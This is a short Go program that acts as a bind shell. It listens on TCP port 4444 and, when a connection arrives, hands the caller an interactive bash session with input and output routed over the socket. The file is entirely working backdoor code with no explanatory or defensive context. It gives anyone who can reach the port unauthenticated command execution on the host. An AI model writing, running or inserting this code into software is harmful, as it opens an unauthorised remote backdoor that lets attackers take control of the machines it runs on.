package main

import (
	"net"
	"os/exec"
)

func main() {
	ln, err := net.Listen("tcp", ":4444")
	if err != nil {
		panic(err)
	}
	defer ln.Close()

	conn, err := ln.Accept()
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := exec.Command("/bin/bash", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()
}